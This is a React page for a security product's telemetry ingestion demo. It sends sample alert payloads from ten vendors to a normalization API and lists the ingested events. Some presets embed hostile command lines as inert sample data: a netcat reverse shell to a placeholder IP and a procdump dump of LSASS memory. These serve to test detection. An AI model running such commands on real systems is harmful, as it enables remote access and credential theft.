"use client";

import React, { useState,useEffect } from "react";
import { useRouter } from "next/navigation";
import { useDemoState } from "@/lib/demo-state";
import { ZoikoShieldApiClient } from "@/lib/api-client";
import { formatTimestamp, truncateHash } from "@/lib/utils";
import { Card } from "@/ui/Card";
import { Button } from "@/ui/Button";
import { Badge } from "@/ui/Badge";
import {
  Send,
  Zap,
  FileCode,
  ShieldAlert,
  ArrowRight,
  Activity,
} from "lucide-react";

export default function IngestionPage() {
  const router = useRouter();
  const [state] = useDemoState();
  const [selectedConnectorId, setSelectedConnectorId] = useState(
    "conn-webhook-gateway-01"
  );
  const [rawJson, setRawJson] = useState(`{
  "eventName": "AttachUserPolicy",
  "eventSource": "iam.amazonaws.com",
  "userIdentity": {
    "arn": "arn:aws:iam::123456:user/admin",
    "type": "IAMUser",
    "userName": "admin"
  },
  "sourceIPAddress": "203.0.113.50",
  "awsRegion": "us-east-1",
  "requestParameters": {
    "roleArn": "arn:aws:iam::aws:policy/AdministratorAccess"
  }
}`);
  const [isSending, setIsSending] = useState(false);
  const [lastNormalized, setLastNormalized] = useState<any>(null);
  const [lastMeta, setLastMeta] = useState<any>(null);
  const [alertTriggered, setAlertTriggered] = useState(false);
  const [liveEvents, setLiveEvents] = useState<any[]>([]);
  const [isLoadingLive, setIsLoadingLive] = useState(false);

  const fetchLiveEvents = async () => {
    setIsLoadingLive(true);
    try {
      const res = await ZoikoShieldApiClient.getEvents({ limit: 50 });
      setLiveEvents(res.data || []);
    } catch (err) {
      console.error("Failed to fetch live events:", err);
    } finally {
      setIsLoadingLive(false);
    }
  };

  useEffect(() => {
    fetchLiveEvents();
  }, []);

  const handleSend = async () => {
    setIsSending(true);
    setAlertTriggered(false);
    try {
      const parsed = JSON.parse(rawJson);
      const res = await ZoikoShieldApiClient.sendSyntheticTelemetry(
        selectedConnectorId,
        parsed
      );
      setLastNormalized(res.normalized);
      setLastMeta(res);
      setAlertTriggered(res.alertTriggered);
      fetchLiveEvents();
    } catch (err: any) {
      alert("Invalid JSON payload or Ingestion error: " + err.message);
    } finally {
      setIsSending(false);
    }
  };

  const attackPresets = [
    {
      title: "1. GitHub Commit Audit",
      desc: "Live git push audit log from repository",
      payload: {
        action: "GIT_PUSH_COMMIT",
        repository: { full_name: "vishwajeett007/p" },
        pusher: { name: "vishwajeett007" },
        commits: [{ id: "c1a2b3", message: "Security fix: enforce auth headers" }],
      },
    },
    {
      title: "2. AWS CloudTrail IAM",
      desc: "AdministratorAccess policy escalation",
      payload: {
        eventName: "AttachUserPolicy",
        eventSource: "iam.amazonaws.com",
        userIdentity: { arn: "arn:aws:iam::123456:user/admin", userName: "admin", type: "IAMUser" },
        sourceIPAddress: "203.0.113.50",
        awsRegion: "us-east-1",
        requestParameters: { roleArn: "arn:aws:iam::aws:policy/AdministratorAccess" },
      },
    },
    {
      title: "3. AWS GuardDuty Threat",
      desc: "CryptoCurrency miningEC2 finding",
      payload: {
        id: "gd-find-8899",
        type: "CryptoCurrency:EC2/BitcoinTool.B!DNS",
        title: "EC2 instance querying Bitcoin DNS seed",
        description: "Instance i-0a1b2c3d queried known mining pool DNS server.",
        severity: 8.0,
        arn: "arn:aws:guardduty:us-east-1:123456:finding/8899",
        schemaVersion: "2.0",
        resource: { instanceDetails: { instanceId: "i-0a1b2c3d" } },
      },
    },
    {
      title: "4. CrowdStrike Falcon EDR",
      desc: "LSASS memory dump process activity",
      payload: {
        composite_id: "cs-det-101",
        max_severity: 4,
        device: { device_id: "dev-prod-01", hostname: "prod-worker-01", local_ip: "10.0.4.18", os_version: "Ubuntu 22.04" },
        behaviors: [{ cmdline: "procdump.exe -ma lsass.exe", filename: "procdump.exe", user_name: "root", tactic: "Credential Access", technique: "OS Credential Dumping" }],
      },
    },
    {
      title: "5. SentinelOne Singularity",
      desc: "Ransomware file encryption detection",
      payload: {
        id: "s1-th-505",
        threatInfo: { threatId: "th-9912", threatName: "WannaCry.Variant", classification: "Ransomware", confidenceScore: 95, processUser: "Administrator", incidentStatus: "unresolved", mitigationStatus: "mitigated" },
        agentDetectionInfo: { agentId: "ag-404", agentComputerName: "WIN-EXEC-01", agentIp: "192.168.1.105", agentOsName: "Windows Server 2022" },
      },
    },
    {
      title: "6. Microsoft Entra ID",
      desc: "High-risk failed sign-in anomaly",
      payload: {
        id: "entra-log-7788",
        userPrincipalName: "victim.engineer@acme.com",
        appDisplayName: "Azure Portal",
        ipAddress: "198.51.100.42",
        status: { errorCode: 50126, failureReason: "Invalid username or password" },
        conditionalAccessStatus: "failure",
        riskLevelDuringSignIn: "high",
        deviceDetail: { browser: "Chrome 120", operatingSystem: "Windows 11", isCompliant: false },
      },
    },
    {
      title: "7. Okta Identity Auth",
      desc: "MFA challenge failure logoff",
      payload: {
        uuid: "okta-evt-303",
        eventType: "user.authentication.auth_via_mfa",
        published: new Date().toISOString(),
        actor: { id: "00u1a2b3c", displayName: "Ops Admin", alternateId: "admin.ops@acme.com", type: "User" },
        client: { ipAddress: "198.51.100.99", geographicalContext: { city: "Frankfurt", country: "Germany" } },
        outcome: { result: "FAILURE", reason: "INVALID_OTP" },
      },
    },
    {
      title: "8. Palo Alto Cortex XDR",
      desc: "Command & Control beaconing incident",
      payload: {
        incident_id: "cortex-inc-909",
        severity: "critical",
        description: "C2 Beaconing behavior detected from internal host",
        alerts: [{ alert_id: "alt-88", name: "C2 Traffic to Suspicious IP", category: "COMMAND_AND_CONTROL", host_name: "db-server-01", host_ip: "10.0.1.50", user_name: "service-account", causality_actor_process_image_name: "/usr/bin/nc", causality_actor_process_command_line: "nc -e /bin/bash 198.51.100.88 4444" }],
      },
    },
    {
      title: "9. Syslog SSH Failure",
      desc: "RFC 5424 auth failure message",
      payload: {
        priority: 14,
        facility: 1,
        severity: 6,
        hostname: "firewall-edge-01",
        appName: "sshd",
        message: "Failed password for invalid user admin from 198.51.100.42 port 44102 ssh2",
        sourceIp: "198.51.100.42",
      },
    },
    {
      title: "10. Generic Webhook",
      desc: "Custom JSON security payload",
      payload: {
        eventClass: "API_GATEWAY",
        activity: "RATE_LIMIT_EXCEEDED",
        severity: "HIGH",
        email: "api-client@external.com",
        sourceIp: "203.0.113.111",
        action: "EXCEED_QUOTA",
        outcome: "DENIED",
      },
    },
  ];

  return (
    <div className="space-y-6">
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div className="space-y-1">
          <div className="flex items-center gap-2">
            <Badge variant="pass">ERB-01 STEP 5</Badge>
            <span className="text-xs font-mono text-cyan-400 font-bold">
              INGESTION & NORMALIZATION PIPELINE
            </span>
          </div>
          <h1 className="text-2xl font-black text-slate-100 tracking-tight">
            Live Telemetry Ingestion Console
          </h1>
          <p className="text-sm text-slate-400">
            Inject synthetic security telemetry across 10 tool providers, inspect OCSF normalization, and view live incoming events.
          </p>
        </div>

        <div className="flex items-center gap-3">
          <Button variant="outline" onClick={fetchLiveEvents} isLoading={isLoadingLive}>
            <span>Refresh Events Backbone</span>
          </Button>
          <Button variant="cyan" onClick={() => router.push("/alerts")}>
            <span>Proceed to Alerts Queue</span>
            <ArrowRight className="w-4 h-4" />
          </Button>
        </div>
      </div>

      {/* Preset Buttons Grid (10 Providers) */}
      <div className="grid grid-cols-2 md:grid-cols-5 gap-2">
        {attackPresets.map((preset, idx) => (
          <button
            key={idx}
            onClick={() => setRawJson(JSON.stringify(preset.payload, null, 2))}
            className="p-2.5 rounded-xl bg-slate-900/80 border border-slate-800 hover:border-cyan-500/40 text-left transition-all group cursor-pointer space-y-1"
          >
            <span className="text-[11px] font-bold text-slate-200 group-hover:text-cyan-300 transition-colors block truncate">
              {preset.title}
            </span>
            <p className="text-[10px] font-mono text-slate-400 truncate">{preset.desc}</p>
          </button>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Left: Raw Telemetry Injector */}
        <Card className="space-y-4">
          <div className="flex items-center justify-between pb-3 border-b border-slate-800">
            <h3 className="font-semibold text-slate-100 flex items-center gap-2 text-sm">
              <FileCode className="w-4 h-4 text-cyan-400" />
              Raw Telemetry Ingestion Payload (JSON)
            </h3>
            <select
              value={selectedConnectorId}
              onChange={(e) => setSelectedConnectorId(e.target.value)}
              className="bg-slate-900 border border-slate-700 rounded-lg px-2.5 py-1 text-xs text-cyan-300 font-mono"
            >
              {state.connectors.map((c, idx) => (
                <option key={c.id || idx} value={c.id}>
                  {c.name}
                </option>
              ))}
            </select>
          </div>

          <textarea
            rows={13}
            value={rawJson}
            onChange={(e) => setRawJson(e.target.value)}
            className="w-full p-3 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs text-cyan-300 focus:outline-none focus:border-cyan-500"
          />

          <div className="flex items-center justify-between">
            <span className="text-[11px] font-mono text-slate-500">
              AIMD Buffer: 100% Operational • Backpressure: Normal
            </span>
            <Button
              variant="primary"
              onClick={handleSend}
              isLoading={isSending}
            >
              <Send className="w-3.5 h-3.5" />
              <span>Ingest & Normalize Payload</span>
            </Button>
          </div>
        </Card>

        {/* Right: Normalized OCSF View */}
        <Card className="space-y-4">
          <div className="flex items-center justify-between pb-3 border-b border-slate-800">
            <h3 className="font-semibold text-slate-100 flex items-center gap-2 text-sm">
              <Zap className="w-4 h-4 text-emerald-400" />
              Normalized Telemetry Record (`OCSF Normalized`)
            </h3>
            {lastNormalized && <Badge variant="pass">NORMALIZED</Badge>}
          </div>

          {lastNormalized ? (
            <div className="space-y-4 font-mono text-xs">
              {lastMeta?.ocsf && (
                <div className="p-2.5 rounded-lg bg-cyan-950/40 border border-cyan-500/30 flex items-center justify-between text-cyan-300 text-[11px]">
                  <span>PROVIDER: <strong className="text-white">{lastMeta.provider}</strong></span>
                  <span>OCSF CAT: <strong className="text-white">{lastMeta.ocsf.category_uid}</strong> | CLASS: <strong className="text-white">{lastMeta.ocsf.class_uid}</strong></span>
                  <span>VER: <strong className="text-white">{lastMeta.mappingVersion || "ocsf-map-17"}</strong></span>
                </div>
              )}

              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2 text-slate-300">
                <div className="flex justify-between">
                  <span className="text-slate-500">EVENT ID:</span>
                  <span className="text-cyan-400">{lastNormalized.id}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">CLASS / CATEGORY:</span>
                  <span className="text-slate-200">
                    {lastNormalized.eventClass} / {lastNormalized.eventCategory}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">ACTIVITY / ACTION:</span>
                  <span className="text-amber-400 font-semibold">{lastNormalized.eventActivity || lastNormalized.action}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">ACTOR:</span>
                  <span className="text-slate-200">{lastNormalized.actorUserId || lastNormalized.actorEmail}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">SOURCE IP:</span>
                  <span className="text-rose-400">{lastNormalized.sourceIp}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">OUTCOME:</span>
                  <Badge variant={lastNormalized.outcome === "FAILED" || lastNormalized.outcome === "DENIED" ? "critical" : "pass"}>
                    {lastNormalized.outcome}
                  </Badge>
                </div>
                <div className="flex justify-between pt-1 border-t border-slate-900">
                  <span className="text-slate-500">SHA-256 RAW HASH:</span>
                  <span className="text-cyan-300">{truncateHash(lastNormalized.rawPayloadHash || "", 10, 8)}</span>
                </div>
              </div>

              {alertTriggered && (
                <div className="p-3.5 rounded-xl bg-rose-950/40 border border-rose-500/40 flex items-center justify-between text-rose-300">
                  <div className="flex items-center gap-2">
                    <ShieldAlert className="w-4 h-4 text-rose-400 animate-pulse" />
                    <span>Detection Triggered: P1 Alert Generated!</span>
                  </div>
                  <Button size="sm" variant="danger" onClick={() => router.push("/alerts")}>
                    <span>View Alert</span>
                    <ArrowRight className="w-3.5 h-3.5" />
                  </Button>
                </div>
              )}
            </div>
          ) : (
            <div className="py-16 text-center text-slate-500 font-mono text-xs">
              Select an Attack Preset above or paste JSON, then click &quot;Ingest &amp; Normalize Payload&quot; to test OCSF normalization.
            </div>
          )}
        </Card>
      </div>

      {/* Live Normalized Events Backbone Feed Table */}
      <Card className="space-y-4">
        <div className="flex items-center justify-between pb-3 border-b border-slate-800">
          <div className="space-y-0.5">
            <h3 className="font-semibold text-slate-100 flex items-center gap-2 text-sm">
              <Activity className="w-4 h-4 text-cyan-400" />
              Live Normalized Events Backbone Stream (`GET /api/v1/events`)
            </h3>
            <p className="text-xs text-slate-400">
              Real-time audit log stream showing webhooks ingested from live GitHub commits, Postman, or local tunnels.
            </p>
          </div>
          <Badge variant="healthy">{liveEvents.length} Events Ingested</Badge>
        </div>

        {liveEvents.length > 0 ? (
          <div className="overflow-x-auto">
            <table className="w-full text-left font-mono text-xs text-slate-300">
              <thead className="bg-slate-950 text-slate-400 border-b border-slate-800 text-[11px]">
                <tr>
                  <th className="py-2.5 px-3">EVENT ID</th>
                  <th className="py-2.5 px-3">ENVIRONMENT</th>
                  <th className="py-2.5 px-3">CLASS / CATEGORY</th>
                  <th className="py-2.5 px-3">ACTOR</th>
                  <th className="py-2.5 px-3">ACTION / ACTIVITY</th>
                  <th className="py-2.5 px-3">SEVERITY</th>
                  <th className="py-2.5 px-3">OUTCOME</th>
                  <th className="py-2.5 px-3">TIME</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/60">
                {liveEvents.map((evt, idx) => (
                  <tr key={evt.id || idx} className="hover:bg-slate-900/60 transition-colors">
                    <td className="py-2 px-3 text-cyan-400 font-semibold">{evt.id}</td>
                    <td className="py-2 px-3 text-slate-300 text-[11px]">{evt.environmentId || "PRODUCTION"}</td>
                    <td className="py-2 px-3 text-slate-400">
                      {evt.eventClass} / <span className="text-slate-200">{evt.eventCategory}</span>
                    </td>
                    <td className="py-2 px-3 text-slate-200">{evt.actorUserId || evt.actorEmail}</td>
                    <td className="py-2 px-3 text-amber-300">{evt.action || evt.eventActivity}</td>
                    <td className="py-2 px-3">
                      <Badge variant={evt.severity === "HIGH" || evt.severity === "CRITICAL" ? "critical" : "pass"}>
                        {evt.severity}
                      </Badge>
                    </td>
                    <td className="py-2 px-3">
                      <Badge variant={evt.outcome === "FAILED" || evt.outcome === "DENIED" ? "critical" : "healthy"}>
                        {evt.outcome}
                      </Badge>
                    </td>
                    <td className="py-2 px-3 text-slate-400 text-[10px]">{formatTimestamp(evt.occurredAt)}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        ) : (
          <div className="py-8 text-center text-slate-500 font-mono text-xs">
            No events ingested yet. Send webhooks via Postman or GitHub to populate the live backbone stream.
          </div>
        )}
      </Card>
    </div>
  );
}
